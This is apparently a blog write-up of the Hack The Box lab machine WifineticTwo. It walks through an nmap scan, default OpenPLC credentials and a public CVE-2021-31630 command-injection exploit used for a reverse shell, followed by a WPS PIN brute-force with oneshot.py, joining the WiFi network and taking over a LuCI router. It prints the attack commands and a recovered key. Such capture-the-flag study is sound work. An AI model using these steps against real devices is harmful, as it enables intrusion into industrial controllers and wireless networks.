---
date: 2024-07-26T15:04:48-05:00
# description: ""
image: "/images/HTB-WifineticTwo/WifineticTwo.png"
showTableOfContents: true
tags: ["HackTheBox"]
categories: ["Writeups"]
title: "HTB: WifineticTwo"
type: "post"
---

* Platforme: Hack The Box
* Lien: [WifineticTwo](https://app.hackthebox.com/machines/WifineticTwo)
* Niveau: Moyen
* OS: Linux
---

WifineticTwo is a unique box focused on WiFi exploitation. The challenge begins with an accessible OpenPLC page using default credentials. Utilizing CVE-2021-31630, we gain an initial foothold and capture the user flag. Once inside the target system, we brute-force the WPS key, configure the wireless interface, and scan the default gateway to discover internal services. We then access the Lua Configuration Interface, set up a new password, log in via SSH, and retrieve the root flag.

Target IP address - `10.10.11.7`


## Scanning

```
nmap -sC -sV -oA nmap/WifineticTwo 10.10.11.7
```

**Results**

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-25 16:39 CDT
Nmap scan report for 10.10.11.7
Host is up (0.044s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
8080/tcp open  http-proxy Werkzeug/1.0.1 Python/2.7.18
|_http-server-header: Werkzeug/1.0.1 Python/2.7.18
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     content-type: text/html; charset=utf-8
|     content-length: 232
|     vary: Cookie
|     set-cookie: session=eyJfcGVybWFuZW50Ijp0cnVlfQ.ZirNoQ.AmaMpNOmDGYGQIpwEDtx5obFU08; Expires=Thu, 25-Apr-2024 21:44:45 GMT; HttpOnly; Path=/
|     server: Werkzeug/1.0.1 Python/2.7.18
|     date: Thu, 25 Apr 2024 21:39:45 GMT
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.0 302 FOUND
|     content-type: text/html; charset=utf-8
|     content-length: 219
|     location: http://0.0.0.0:8080/login
|     vary: Cookie
|     set-cookie: session=eyJfZnJlc2giOmZhbHNlLCJfcGVybWFuZW50Ijp0cnVlfQ.ZirNoA.yRUPYgrZ-4AxE2_xa8pbWYvKGq8; Expires=Thu, 25-Apr-2024 21:44:44 GMT; HttpOnly; Path=/
|     server: Werkzeug/1.0.1 Python/2.7.18
|     date: Thu, 25 Apr 2024 21:39:44 GMT
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to target URL: <a href="/login">/login</a>. If not click the link.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     content-type: text/html; charset=utf-8
|     allow: HEAD, OPTIONS, GET
|     vary: Cookie
|     set-cookie: session=eyJfcGVybWFuZW50Ijp0cnVlfQ.ZirNoA.Q1AI3_zm-RnXi7eGU_QELZS5lag; Expires=Thu, 25-Apr-2024 21:44:44 GMT; HttpOnly; Path=/
|     content-length: 0
|     server: Werkzeug/1.0.1 Python/2.7.18
|     date: Thu, 25 Apr 2024 21:39:44 GMT
|   RTSPRequest: 
|     HTTP/1.1 400 Bad request
|     content-length: 90
|     cache-control: no-cache
|     content-type: text/html
|     connection: close
|     <html><body><h1>400 Bad request</h1>
|     Your browser sent an invalid request.
|_    </body></html>
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was http://10.10.11.7:8080/login
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.94SVN%I=7%D=4/25%Time=662ACD97%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,24C,"HTTP/1\.0\x20302\x20FOUND\r\ncontent-type:\x20text/htm
SF:l;\x20charset=utf-8\r\ncontent-length:\x20219\r\nlocation:\x20http://0\
SF:.0\.0\.0:8080/login\r\nvary:\x20Cookie\r\nset-cookie:\x20session=eyJfZn
SF:Jlc2giOmZhbHNlLCJfcGVybWFuZW50Ijp0cnVlfQ\.ZirNoA\.yRUPYgrZ-4AxE2_xa8pbW
SF:YvKGq8;\x20Expires=Thu,\x2025-Apr-2024\x2021:44:44\x20GMT;\x20HttpOnly;
SF:\x20Path=/\r\nserver:\x20Werkzeug/1\.0\.1\x20Python/2\.7\.18\r\ndate:\x
SF:20Thu,\x2025\x20Apr\x202024\x2021:39:44\x20GMT\r\n\r\n<!DOCTYPE\x20HTML
SF:\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x203\.2\x20Final//EN\">\n<title>Red
SF:irecting\.\.\.</title>\n<h1>Redirecting\.\.\.</h1>\n<p>You\x20should\x2
SF:0be\x20redirected\x20automatically\x20to\x20target\x20URL:\x20<a\x20hre
SF:f=\"/login\">/login</a>\.\x20\x20If\x20not\x20click\x20the\x20link\.")%
SF:r(HTTPOptions,14E,"HTTP/1\.0\x20200\x20OK\r\ncontent-type:\x20text/html
SF:;\x20charset=utf-8\r\nallow:\x20HEAD,\x20OPTIONS,\x20GET\r\nvary:\x20Co
SF:okie\r\nset-cookie:\x20session=eyJfcGVybWFuZW50Ijp0cnVlfQ\.ZirNoA\.Q1AI
SF:3_zm-RnXi7eGU_QELZS5lag;\x20Expires=Thu,\x2025-Apr-2024\x2021:44:44\x20
SF:GMT;\x20HttpOnly;\x20Path=/\r\ncontent-length:\x200\r\nserver:\x20Werkz
SF:eug/1\.0\.1\x20Python/2\.7\.18\r\ndate:\x20Thu,\x2025\x20Apr\x202024\x2
SF:021:39:44\x20GMT\r\n\r\n")%r(RTSPRequest,CF,"HTTP/1\.1\x20400\x20Bad\x2
SF:0request\r\ncontent-length:\x2090\r\ncache-control:\x20no-cache\r\ncont
SF:ent-type:\x20text/html\r\nconnection:\x20close\r\n\r\n<html><body><h1>4
SF:00\x20Bad\x20request</h1>\nYour\x20browser\x20sent\x20an\x20invalid\x20
SF:request\.\n</body></html>\n")%r(FourOhFourRequest,224,"HTTP/1\.0\x20404
SF:\x20NOT\x20FOUND\r\ncontent-type:\x20text/html;\x20charset=utf-8\r\ncon
SF:tent-length:\x20232\r\nvary:\x20Cookie\r\nset-cookie:\x20session=eyJfcG
SF:VybWFuZW50Ijp0cnVlfQ\.ZirNoQ\.AmaMpNOmDGYGQIpwEDtx5obFU08;\x20Expires=T
SF:hu,\x2025-Apr-2024\x2021:44:45\x20GMT;\x20HttpOnly;\x20Path=/\r\nserver
SF::\x20Werkzeug/1\.0\.1\x20Python/2\.7\.18\r\ndate:\x20Thu,\x2025\x20Apr\
SF:x202024\x2021:39:45\x20GMT\r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W
SF:3C//DTD\x20HTML\x203\.2\x20Final//EN\">\n<title>404\x20Not\x20Found</ti
SF:tle>\n<h1>Not\x20Found</h1>\n<p>The\x20requested\x20URL\x20was\x20not\x
SF:20found\x20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x20URL\
SF:x20manually\x20please\x20check\x20your\x20spelling\x20and\x20try\x20aga
SF:in\.</p>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.39 seconds
```

Our scan reveals two open ports 22 (SSH) and 8080 (http-proxy).

## Enumeration

We find a login form at `http://10.10.11.7:8080` for OpenPLC Webserver.

![OpenPLC login form](/images/HTB-WifineticTwo/OpenPLC-webserver.png)

The default credentials allow us to login.

![OpenPLC default credentials](/images/HTB-WifineticTwo/openplc-creds.png)

We access the Dashboard. The different sections give us some information but nothing is standing out at the moment.

![OpenPLC dashboard](/images/HTB-WifineticTwo/openPLC-dashboard.png)

## Initial Foothold

We find [CVE-2021-31630](https://nvd.nist.gov/vuln/detail/CVE-2021-31630) which is a command injection vulnerability for Open PLC Webserver v3 and an exploit is available [here](https://github.com/Hunt3r0x/CVE-2021-31630-HTB).

> To make this exploit work you have to add the target IP as `wifinetictwo.htb` in your `/etc/hosts` file.

After running the exploit we catch a shell on out listener.

```
python ./exploit.py -ip <IP_ADDRESS> -p <PORT_NUMBER> -u openplc -pwd openplc
```

![OpenPLC RCE](/images/HTB-WifineticTwo/openplc-rce.png)

![WifineticTwo foothold](/images/HTB-WifineticTwo/foothold.png)

Our shell can be upgraded with the commands below.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'  
export TERM=xterm  
ctrl + z  
stty raw -echo; fg
stty rows 38 columns 116
```

We are connected as `root` and we recover the user flag in `/root`.

![WifineticTwo user flag](/images/HTB-WifineticTwo/user-flag.png)

## Privilege Escalation

It is definitely odd that we were already root for the first flag. This probably means that we need to do some kind of pivoting or access another service.

The name of this box obviously points at WiFi so let's check the network interfaces with `ifconfig`.

![WifineticTwo ifconfig command](/images/HTB-WifineticTwo/ifconfig-cmd.png)

We find a wireless network interface `wlan0`, we know that HTB machines are VMs and do not have internet access so this network interface probably is leveraging some WiFi virtualization.

We can retrieve information about the wireless interface with `iw dev wlan0 scan`. In our case the scan reveals a WiFi network called `plcrouter` with a BSSID of `02:00:00:00:01:00`, it is also running `WPS: Version: 1.0`.

![WifineticTwo iw scan](/images/HTB-WifineticTwo/iw-scan.png)

After reading the [Pentesting Wifi page](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-wifi#wps) on HackTricks, we discovered that we can brute-force WPS keys. Our issue is that in order to use tools such as `reaver` and `bully` we need a wireless adapter (which I do not have currently). Fortunately we can also use [OneShot-C](https://github.com/nikita-yfh/OneShot-C) to perform the attack.

> I ended up using the [Python version](https://github.com/kimocoder/OneShot) of OneShot because I had issues compiling the C version.

We clone the repo, and send the `oneshot.py`  file to the target with `curl`.

![One-shot-py](/images/HTB-WifineticTwo/oneshot-py.png)

We can see how to use the script with `python3 oneshot.py -h`.

![One-shot-py help](/images/HTB-WifineticTwo/oneshot-py-help.png)

We then run our attack with the command below using the interface name and the BSSID. We successfully recover the key which is `NoWWEDoKnowWhaTisReal123!`.

```
python3 ./oneshot.py -i wlan0 -b 02:00:00:00:01:00 -K
```

![One-shot attack](/images/HTB-WifineticTwo/oneshot-attack.png)

Now we need to learn how to connect to WiFi from the command line. We learn from [this thread](https://askubuntu.com/questions/138472/how-do-i-connect-to-a-wpa-wifi-network-using-the-command-line) and [that one](https://unix.stackexchange.com/questions/283722/how-to-connect-to-wifi-from-command-line) that we need a configuration file.

We create it with `wpa_passphrase`.

```
wpa_passphrase 'plcrouter' 'NoWWEDoKnowWhaTisReal123!' > wpa.conf
```

![WPA config file](/images/HTB-WifineticTwo/wpa_passphrase.png)

> The WPA supplicant process is responsible for managing wireless connections on Linux systems.

```
wpa_supplicant -B -c wpa.conf -i wlan0
```

![WPA supplicant](/images/HTB-WifineticTwo/wpa_supplicant.png)

We verify the interface configuration with `iwconfig`.

![iwconfig command](/images/HTB-WifineticTwo/iwconfig.png)

Using `ifconfig` we can see that the interface is up but there is no IP address configured for `wlan0`.

![wlan0 no IP address](/images/HTB-WifineticTwo/ifconfig-noIP.png)

We can manually set an IP address with 

```
ifconfig wlan0 <IP_ADDRESS> netmask <NETWORK_MASK>
```

```
ifconfig wlan0 192.168.1.50 netmask 255.255.255.0
```

![ifconfig IP address](/images/HTB-WifineticTwo/ifconfig-IP.png)

Now that we have our new interface properly set up let's scan it in hopes of discovering more leads.

We download the nmap binary from [here](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap) and send it to the target. Make sure to make it executable with `chmod +x nmap`.

```
./nmap -sn 192.168.1.0/24
```

We see the default gateway `192.168.1.1` and our configured address `192.168.1.50` among others. 

![nmap scan configured IP address](/images/HTB-WifineticTwo/nmap_scan.png)

After scanning the default gateway we discover more services, we will need some tunneling to access them (I used chisel for this box).

![nmap default gateway scan](/images/HTB-WifineticTwo/nmap-internal.png)

We find a page with a title of `ap - LuCI`, which is referring to the [Lua Configuration Interface](https://launchpad.net/luci), "a collection of free Lua software for embedded devices." 

![LuCI page](/images/HTB-WifineticTwo/LuCI.png)

For the authentication `root` will work for the password and we are asked to configure a new one.

Under `System` --> `Administration` we notice that we have the option to login with a password. 

![LuCI SSH access](/images/HTB-WifineticTwo/LuCI-SSH-access.png)

With our newly configured password we login via SSH and find the root flag.

![Root flag](/images/HTB-WifineticTwo/root-flag.png)

## Closing Words

I enjoyed this box as it was a nice change of pace from the usual web-based exploitation, I hope I was able to be helpful with this write up. Thank you for checking my blog!
